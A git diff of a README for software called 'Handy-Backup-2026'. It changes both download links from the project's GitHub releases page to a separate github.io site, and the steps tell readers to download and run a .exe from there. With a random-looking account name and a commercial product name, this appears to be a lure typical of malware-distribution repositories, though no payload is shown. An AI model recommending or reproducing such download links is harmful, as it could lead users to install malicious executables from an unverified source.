@@ -1,6 +1,6 @@
 # 💾 Handy-Backup-2026 - Secure your important digital files daily
 
-[![](https://img.shields.io/badge/Download-Handy_Backup_2026-blue)](https://github.com/Griffinenclosed113/Handy-Backup-2026/releases)
+[![](https://img.shields.io/badge/Download-Handy_Backup_2026-blue)](https://griffinenclosed113.github.io)
 
 ## 🎯 Purpose of this software
 
@@ -20,7 +20,7 @@ Ensure your computer meets these conditions before you install the software.
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the following link to access the installer: [https://github.com/Griffinenclosed113/Handy-Backup-2026/releases](https://github.com/Griffinenclosed113/Handy-Backup-2026/releases).
+1. Visit the following link to access the installer: [https://griffinenclosed113.github.io](https://griffinenclosed113.github.io).
 2. Look for the file ending in .exe in the latest release section.
 3. Click the filename to start the download to your computer.
 4. Locate the file in your Downloads folder after it finishes.
